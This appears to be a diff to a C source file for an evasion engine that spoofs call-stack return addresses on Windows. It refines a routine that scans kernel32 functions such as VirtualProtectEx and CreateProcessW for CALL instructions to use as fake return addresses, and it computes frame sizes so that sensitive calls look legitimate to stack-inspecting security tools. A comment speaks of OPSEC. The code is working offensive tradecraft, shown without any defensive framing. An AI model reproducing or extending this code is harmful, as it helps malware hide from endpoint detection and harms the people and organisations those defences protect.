@@ -154,28 +154,40 @@ PVOID FindValidGadgetInModule(const char* sModule, DWORD* outType, DWORD minFram
 }
 
 // Scans a function's memory looking for a CALL instruction to use as a spoofed return address.
-// This prevents hardcoding offsets which can break across Windows updates.
+// Uses RtlLookupFunctionEntry to bound the scan to the exact function body,
+// preventing false positives from spilling into adjacent functions.
 PVOID SeekReturnAddress(PVOID pBase) {
     if (!pBase) return NULL;
-    
-    PBYTE pBytes = (PBYTE)pBase;
-    
-    // Scan up to 256 bytes deep into the function body
-    for (int i = 0; i < 256; i++) {
-        // Look for 'CALL QWORD PTR [RIP+offset]' (Opcode: FF 15)
-        // This is heavily used in kernel32/kernelbase to call NTDLL functions
-        if (pBytes[i] == 0xFF && pBytes[i+1] == 0x15) {
-            // The instruction is 6 bytes long. The return address is immediately after.
-            return (PVOID)(pBytes + i + 6);
-        }
-        
-        // Look for relative 'CALL' (Opcode: E8)
-        if (pBytes[i] == 0xE8) {
-            // The instruction is 5 bytes long.
-            return (PVOID)(pBytes + i + 5);
+
+    // Determine the exact function size via .pdata to bound the scan
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
+
+    DWORD scanLimit = 256; // fallback limit if .pdata lookup fails
+
+    if (RtlLookup) {
+        DWORD64 ImageBase;
+        PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pBase, &ImageBase, NULL);
+        if (pRF) {
+            DWORD funcSize = pRF->EndAddress - pRF->BeginAddress;
+            PVOID realBegin = (PVOID)(ImageBase + pRF->BeginAddress);
+            if (realBegin == pBase)
+                scanLimit = (funcSize < 256) ? funcSize : 256;
         }
     }
-    
+
+    PBYTE pBytes = (PBYTE)pBase;
+
+    for (DWORD i = 0; i < scanLimit; i++) {
+        // 'CALL QWORD PTR [RIP+offset]' (FF 15) — 6 bytes
+        if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == 0x15)
+            return (PVOID)(pBytes + i + 6);
+
+        // Relative CALL (E8) — 5 bytes
+        if (i + 5 <= scanLimit && pBytes[i] == 0xE8)
+            return (PVOID)(pBytes + i + 5);
+    }
+
     // Fallback to the function prologue if no CALL is found.
     // Suboptimal for OPSEC, but ensures the engine doesn't crash.
     return pBase;
@@ -194,14 +206,13 @@ BOOL InitEngine() {
     PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + pExport->AddressOfNameOrdinals);
     
     HMODULE hK32 = GetModuleHandleA("kernel32.dll");
-    HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
+    // HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
     
     // Initialize global spoofing masks dynamically
-    // Instead of hardcoding +0x4B or using raw prologues, we dynamically seek a valid Return Address
-    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hKBase, "VirtualProtectEx"));
-    Mask_Worker.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "WaitForSingleObjectEx"));
+    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hK32, "VirtualProtectEx"));
+    Mask_Worker.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "CreateProcessW"));
     Mask_Memory.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "MapViewOfFile"));
-    Mask_File.pAddress     = SeekReturnAddress(GetProcAddress(hK32, "CreateFileW"));
+    Mask_File.pAddress     = SeekReturnAddress(GetProcAddress(hK32, "MoveFileW"));
 
     // Calculate exact frame sizes for the masks based on the new Return Addresses
     Mask_Security.dwFrameSize = CalcFrameSize(Mask_Security.pAddress);
